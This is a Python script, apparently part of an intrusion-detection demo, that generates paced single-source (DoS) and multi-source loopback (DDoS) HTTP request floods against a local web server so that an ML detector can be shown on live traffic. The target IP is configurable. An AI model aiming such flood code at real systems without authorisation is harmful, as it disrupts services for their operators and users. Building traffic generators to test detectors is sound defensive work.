"""
Attack generator for the live-capture demo.

Generates HTTP-request floods against a local web server so the IDS can be
demonstrated on real sockets:

    DoS  mode : all traffic from a single source IP
    DDoS mode : traffic from many source IPs (127.0.0.2 .. .N loopback
                aliases), i.e. distributed sources hitting one target

Unlike the old 5000-thread version this one is paced: it targets a chosen
packets/second rate so measured traffic stays inside the ranges the ML model
was trained on, and it shuts down cleanly.

Usage:
    # 1. serve a target
    python -m http.server 8000 --bind 127.0.0.1

    # 2. flood it (single source)
    python dos_generator.py --mode dos --pps 130 --duration 14

    # 3. or flood it from 8 source IPs (DDoS)
    python dos_generator.py --mode ddos --pps 120 --sources 8 --duration 14
"""
import argparse
import random
import socket
import threading
import time


def _request(target_ip: str, target_port: int, local_ip: str,
             payload: int = 0) -> None:
    """Open one connection, send an HTTP GET (+ optional payload bytes)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        if local_ip:
            s.bind((local_ip, 0))
        s.connect((target_ip, target_port))
        body = (b"x" * payload) if payload else b""
        s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\nContent-Length: "
                  + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n"
                  + body)
        s.close()
    except Exception:
        pass


def _worker(worker_id: int, cfg, stop: threading.Event, sent: list):
    """Send paced requests until stopped.  pps is split across workers."""
    per_worker = cfg.pps / max(cfg.sources, 1)
    interval = 1.0 / per_worker if per_worker > 0 else 1.0
    local_ip = None
    if cfg.mode == "ddos":
        # bind each worker to its own loopback alias so source IPs differ
        local_ip = f"127.0.0.{1 + worker_id % 200}"

    rng = random.Random(worker_id)
    next_t = time.perf_counter()
    while not stop.is_set():
        _request(cfg.target, cfg.port, local_ip, cfg.payload)
        sent[worker_id] += 1
        next_t += interval * rng.uniform(0.85, 1.15)
        delay = next_t - time.perf_counter()
        if delay > 0:
            stop.wait(delay)


def main():
    ap = argparse.ArgumentParser(description="DoS/DDoS HTTP flood generator")
    ap.add_argument("--target", default="127.0.0.1",
                    help="target IP (default 127.0.0.1)")
    ap.add_argument("--port", type=int, default=8000,
                    help="target port (default 8000)")
    ap.add_argument("--mode", choices=["dos", "ddos"], default="dos",
                    help="dos = 1 source, ddos = many sources")
    ap.add_argument("--pps", type=int, default=130,
                    help="target packets/second (default 130)")
    ap.add_argument("--payload", type=int, default=1000,
                    help="extra payload bytes per request (default 1000). "
                         "~800-1500 matches the EV-charging message sizes the "
                         "ML model was trained on; 0 = tiny HTTP GETs.")
    ap.add_argument("--sources", type=int, default=8,
                    help="source IPs used in ddos mode (default 8)")
    ap.add_argument("--duration", type=float, default=0,
                    help="run for N seconds, 0 = until Ctrl+C (default 0)")
    cfg = ap.parse_args()

    if cfg.mode == "dos":
        cfg.sources = 1
    cfg.sources = max(1, cfg.sources)

    stop = threading.Event()
    sent = [0] * cfg.sources
    threads = []
    for w in range(cfg.sources):
        t = threading.Thread(target=_worker, args=(w, cfg, stop, sent),
                             daemon=True)
        t.start()
        threads.append(t)

    kind = cfg.mode.upper()
    print(f"🚀 {kind} flood started -> {cfg.target}:{cfg.port}  "
          f"target={cfg.pps} pkt/s  sources={cfg.sources}  "
          f"payload={cfg.payload}B")
    if cfg.mode == "ddos":
        print("   source IPs: " + ", ".join(
            f"127.0.0.{1 + w % 200}" for w in range(cfg.sources)))

    start = time.time()
    try:
        while not stop.is_set():
            time.sleep(1)
            total = sum(sent)
            elapsed = time.time() - start
            print(f"   [{elapsed:5.1f}s] sent={total:6d}  "
                  f"current rate≈{total / elapsed:6.1f} pkt/s")
            if cfg.duration and elapsed >= cfg.duration:
                break
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        for t in threads:
            t.join(timeout=2)
        print(f"🛑 Stopped. {sum(sent)} requests sent over "
              f"{time.time() - start:.1f}s")


if __name__ == "__main__":
    main()
